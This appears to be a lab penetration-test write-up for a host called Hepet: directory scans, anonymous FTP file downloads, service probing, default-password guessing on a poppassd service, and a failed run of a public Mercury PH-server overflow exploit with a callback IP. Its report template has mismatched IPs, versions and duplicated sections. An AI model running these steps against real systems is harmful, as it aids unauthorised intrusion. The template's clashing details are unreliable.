# Hepet

## 5.1 Target #1 – 172.16.203.134

### 5.1.1 Service Enumeration

**Port Scan Results**

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.1.1       | **TCP**: 21,22,25,80,443 

**FTP Enumeration**

Upon manual enumeration of the available FTP service, John noticed it was running an outdated version 2.3.4 that is prone to the remote buffer overflow vulnerability.

### 5.1.2 Initial Access - Buffer Overflow

**Vulnerability Exploited:** Ability Server 2.34 FTP STOR Buffer Overflow

**System Vulnerable:** 172.16.203.134

**Vulnerability Explanation:**
Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field.
Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
When performing the penetration test, John noticed an outdated version of Ability Server running from the service enumeration phase.
In addition, the operating system was different from the known public exploit.
A rewritten exploit was needed in order for successful code execution to occur.
Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Fix:**
The publishers of the Ability Server have issued a patch to fix this known issue
It can be found here: http://www.code-crafters.com/abilityserver/

**Severity:** Critical

**Steps to Reproduce the attack:**

**Proof of Concept Code Here:**
Modifications to the existing exploit was needed and is highlighted in red.

### 5.1.3 Privilege Escalation - 


**Vulnerability Exploited:** Ability Server 2.34 FTP STOR Buffer Overflow

**System Vulnerable:** 172.16.203.134

**Vulnerability Explanation:**
Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field.
Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.
When performing the penetration test, John noticed an outdated version of Ability Server running from the service enumeration phase.
In addition, the operating system was different from the known public exploit.
A rewritten exploit was needed in order for successful code execution to occur.
Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.

**Vulnerability Fix:**
The publishers of the Ability Server have issued a patch to fix this known issue
It can be found here: http://www.code-crafters.com/abilityserver/

**Severity:** Critical

**Steps to Reproduce the attack:**

**Proof of Concept Code Here:**
Modifications to the existing exploit was needed and is highlighted in red.


### Post Exploitation

**System Proof Screenshot**


# Enumeration

## 443 - Web
![](Pasted%20image%2020220306082217.png)

Dir Enumeration

```bash
┌──(kali㉿kali)-[~]
└─$ dirb https://192.168.168.140:443 /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  5 12:49:45 2022
URL_BASE: https://192.168.168.140:443/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: https://192.168.168.140:443/ ----
+ https://192.168.168.140:443/aux (CODE:403|SIZE:306)                                                                                                                  
+ https://192.168.168.140:443/cgi-bin/ (CODE:403|SIZE:306)                                                                                                             
+ https://192.168.168.140:443/com1 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/com2 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/com3 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/com4 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/con (CODE:403|SIZE:306)                                                                                                                  
+ https://192.168.168.140:443/examples (CODE:503|SIZE:406)                                                                                                             
==> DIRECTORY: https://192.168.168.140:443/fonts/                                                                                                                      
+ https://192.168.168.140:443/licenses (CODE:403|SIZE:425)                                                                                                             
+ https://192.168.168.140:443/lpt1 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/lpt2 (CODE:403|SIZE:306)                                                                                                                 
+ https://192.168.168.140:443/nul (CODE:403|SIZE:306)                                                                                                                  
+ https://192.168.168.140:443/phpmyadmin (CODE:403|SIZE:306)                                                                                                           
+ https://192.168.168.140:443/prn (CODE:403|SIZE:306)                                                                                                                  
+ https://192.168.168.140:443/server-info (CODE:403|SIZE:425)                                                                                                          
+ https://192.168.168.140:443/server-status (CODE:403|SIZE:425)                                                                                                        
==> DIRECTORY: https://192.168.168.140:443/team/                                                                                                                       
+ https://192.168.168.140:443/webalizer (CODE:403|SIZE:306)                                                                                                            
                                                                                                                                                                       
---- Entering directory: https://192.168.168.140:443/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: https://192.168.168.140:443/team/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Mar  5 13:51:31 2022
DOWNLOADED: 20458 - FOUND: 17
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 8000 - Web

![](Pasted%20image%2020220306082241.png)

Dir enmeration
```bash
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.168.140:8000 /usr/share/dirb/wordlists/big.txt                                                                                            130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  5 12:49:19 2022
URL_BASE: http://192.168.168.140:8000/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.168.140:8000/ ----
+ http://192.168.168.140:8000/aux (CODE:403|SIZE:307)                                                                                                                  
+ http://192.168.168.140:8000/cgi-bin/ (CODE:403|SIZE:307)                                                                                                             
+ http://192.168.168.140:8000/com1 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/com2 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/com3 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/com4 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/con (CODE:403|SIZE:307)                                                                                                                  
+ http://192.168.168.140:8000/examples (CODE:503|SIZE:407)                                                                                                             
==> DIRECTORY: http://192.168.168.140:8000/fonts/                                                                                                                      
+ http://192.168.168.140:8000/licenses (CODE:403|SIZE:426)                                                                                                             
+ http://192.168.168.140:8000/lpt1 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/lpt2 (CODE:403|SIZE:307)                                                                                                                 
+ http://192.168.168.140:8000/nul (CODE:403|SIZE:307)                                                                                                                  
+ http://192.168.168.140:8000/phpmyadmin (CODE:403|SIZE:307)                                                                                                           
+ http://192.168.168.140:8000/prn (CODE:403|SIZE:307)                                                                                                                  
+ http://192.168.168.140:8000/server-info (CODE:403|SIZE:426)                                                                                                          
+ http://192.168.168.140:8000/server-status (CODE:403|SIZE:426)                                                                                                        
==> DIRECTORY: http://192.168.168.140:8000/team/                                                                                                                       
+ http://192.168.168.140:8000/webalizer (CODE:403|SIZE:307)                                                                                                            
                                                                                                                                                                       
---- Entering directory: http://192.168.168.140:8000/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                       
---- Entering directory: http://192.168.168.140:8000/team/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Mar  5 13:50:28 2022
DOWNLOADED: 20458 - FOUND: 17
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```


## 2224 - Mercury Web

![](Pasted%20image%2020220306082147.png)

## 20001 - FTP

Download all files


```bash
┌──(kali㉿kali)-[/tmp]
└─$ mkdir files                                                                            
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ pftp 192.168.168.140 20001
Connected to 192.168.168.140.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.168.140:kali): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> lcd files
Local directory now /tmp/files
ftp> help
Commands may be abbreviated.  Commands are:

!               dir             mdelete         qc              site
$               disconnect      mdir            sendport        size
account         exit            mget            put             status
append          form            mkdir           pwd             struct
ascii           get             mls             quit            system
bell            glob            mode            quote           sunique
binary          hash            modtime         recv            tenex
bye             help            mput            reget           tick
case            idle            newer           rstatus         trace
cd              image           nmap            rhelp           type
cdup            ipany           nlist           rename          user
chmod           ipv4            ntrans          reset           umask
close           ipv6            open            restart         verbose
cr              lcd             prompt          rmdir           ?
delete          ls              passive         runique
debug           macdef          proxy           send
ftp> prompt
Interactive mode off.
ftp> binary
200 Type set to I
ftp> mget *
local: .babelrc remote: .babelrc
227 Entering Passive Mode (192,168,168,140,195,63)
150 Connection accepted
226 Transfer OK
312 bytes received in 0.00 secs (379.4365 kB/s)
local: .editorconfig remote: .editorconfig
227 Entering Passive Mode (192,168,168,140,195,64)
150 Connection accepted
226 Transfer OK
147 bytes received in 0.00 secs (329.2539 kB/s)
local: .eslintignore remote: .eslintignore
227 Entering Passive Mode (192,168,168,140,195,65)
150 Connection accepted
226 Transfer OK
23 bytes received in 0.00 secs (42.6204 kB/s)
local: .eslintrc.js remote: .eslintrc.js
227 Entering Passive Mode (192,168,168,140,195,66)
150 Connection accepted
226 Transfer OK
779 bytes received in 0.00 secs (546.1179 kB/s)
local: .gitignore remote: .gitignore
227 Entering Passive Mode (192,168,168,140,195,67)
150 Connection accepted
226 Transfer OK
167 bytes received in 0.00 secs (243.7757 kB/s)
local: .postcssrc.js remote: .postcssrc.js
227 Entering Passive Mode (192,168,168,140,195,68)
150 Connection accepted
226 Transfer OK
228 bytes received in 0.00 secs (678.8300 kB/s)
local: .tern-project remote: .tern-project
227 Entering Passive Mode (192,168,168,140,195,69)
150 Connection accepted
226 Transfer OK
346 bytes received in 0.00 secs (1.0030 MB/s)
local: build remote: build
227 Entering Passive Mode (192,168,168,140,195,70)
550 File not found
local: config remote: config
227 Entering Passive Mode (192,168,168,140,195,71)
550 File not found
local: index.html remote: index.html
227 Entering Passive Mode (192,168,168,140,195,72)
150 Connection accepted
226 Transfer OK
1376 bytes received in 0.00 secs (3.1928 MB/s)
local: package-lock.json remote: package-lock.json
227 Entering Passive Mode (192,168,168,140,195,73)
150 Connection accepted
226 Transfer OK
425010 bytes received in 1.38 secs (299.8052 kB/s)
local: package.json remote: package.json
227 Entering Passive Mode (192,168,168,140,195,74)
150 Connection accepted
226 Transfer OK
2454 bytes received in 0.00 secs (1.7730 MB/s)
local: README.md remote: README.md
227 Entering Passive Mode (192,168,168,140,195,75)
150 Connection accepted
226 Transfer OK
1100 bytes received in 0.00 secs (4.2994 MB/s)
local: src remote: src
227 Entering Passive Mode (192,168,168,140,195,76)
550 File not found
local: static remote: static
227 Entering Passive Mode (192,168,168,140,195,77)
550 File not found
local: _redirects remote: _redirects
227 Entering Passive Mode (192,168,168,140,195,78)
150 Connection accepted
226 Transfer OK
127 bytes received in 0.00 secs (636.0176 kB/s)
ftp> exit
421 Service not available, remote server has closed connection
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Mercury

### 79 - Finger
```bash
┌──(kali㉿kali)-[/tmp/files]
└─$ finger @192.168.168.140 
Login: Admin         Name: Mail System Administrator

[No profile information]
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/files]
└─$
```

## 105 - PH Simple Addressbook Server

```bash
┌──(kali㉿kali)-[/tmp/files]
└─$ nc 192.168.168.140 105 -v                                                                                                                                       1 ⨯
192.168.168.140: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.168.140] 105 (?) open
HELP
-200:1: Mercury Simple PH Server v4.62
-200:1: Copyright 1999-2008, David Harris, all rights reserved.
-200:1: 
-200:1: This PH server supports the following commands
-200:1: FIELDS  HELP  QUERY  QUIT  SITEINFO  STATUS
-200:1: 
-200:1: "[fieldname]=" queries are supported
-200:1: "return" clauses are supported in queries
-200:1: wildcard searches are not supported
200:OK.
SITEINFO
-200:1:version:0.9
-200:4:mailbox:email
200:Ready
STATUS
100:Mercury Simple PH Server v0.9
200:Ready
FIELDS
-200:1:name:max 40 public lookup unique indexed default
-200:1:name:Familiar name
-200:2:department:max 40 public lookup default
-200:2:department:User's department or company
-200:3:address:max 60 public lookup default
-200:3:address:Street or delivery address
-200:4:postal:max 60 public lookup default
-200:4:postal:Postal address
-200:5:phone:max 24 public lookup default
-200:5:phone:Contact telephone number
-200:6:fax:max 24 public lookup default
-200:6:fax:Contact facsimile number
-200:7:email:max 100 public lookup default
-200:7:email:Electronic mail address
-200:8:other:max 80 public lookup default
-200:8:other:Other related information
200:OK
QUERY name=Admin
508:No matches for your query.
Query name
508:No matches for your query.
QUERY
501:Empty search not permitted.
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/files]
└─$
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 1375 
  Exploit: Mercury Mail Transport System 4.01b - PH SERVER Remote Overflow
      URL: https://www.exploit-db.com/exploits/1375
     Path: /usr/share/exploitdb/exploits/windows/remote/1375.pl
File Type: ASCII text

Copied to: /tmp/1375.pl


┌──(kali㉿kali)-[/tmp]
└─$ perl ./1375.pl                                                                                                                                                  2 ⨯
Okayokay THiS iS 0DAY!!!
Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT
kcope [kingcope(at)gmx.net] in 2005! JUUAREZ!
Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!
usage: mecurysexywarez.pl target targettype yourip yourport

 [0]...Mercury Mail Transport System 4.01b Win2k SP4/WinXP SP2
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ perl ./1375.pl 192.168.168.140 0 192.168.49.168 8000
Okayokay THiS iS 0DAY!!!
Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT
kcope [kingcope(at)gmx.net] in 2005! JUUAREZ!
Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!
501:Lamer break-in attempt detected - your IP has been reported.
                                                              
┌──(kali㉿kali)-[/tmp]
└─$
```

## 106

```bash
┌──(kali㉿kali)-[/tmp/files]
└─$ nc 192.168.168.140 106 -v                                                                                                                                       1 ⨯
192.168.168.140: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.168.140] 106 (poppassd) open
200 localhost MercuryW PopPass server ready.
HELP
100-Mercury PopPass Server v4.62
100-This server recognizes the following commands:
100-   USER     Enter your user (login) name
100-   PASS     Enter the password matching your username
100-   NEWPASS  Change your password on this system.
100-   QUIT     Logout and close the connection.
100 You must login using USER/PASS before attempting NEWPASS.
USER Admin
300 Send current password using PASS command:
PASS Admin
554 Incorrect username or password.
USER admin
300 Send current password using PASS command:
PASS admin
554 Incorrect username or password.
USER admin
300 Send current password using PASS command:
PASS password
554 Incorrect username or password.
USER guest
300 Send current password using PASS command:
PASS guest
554 Incorrect username or password.
554 Too many failures - terminating connection.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/files]
└─$ nc 192.168.168.140 106 -v
192.168.168.140: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.168.140] 106 (poppassd) open
200 localhost MercuryW PopPass server ready.
NEWPASS
503 Not authenticated
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/files]
└─$ 
```

# Exploitation

# Other
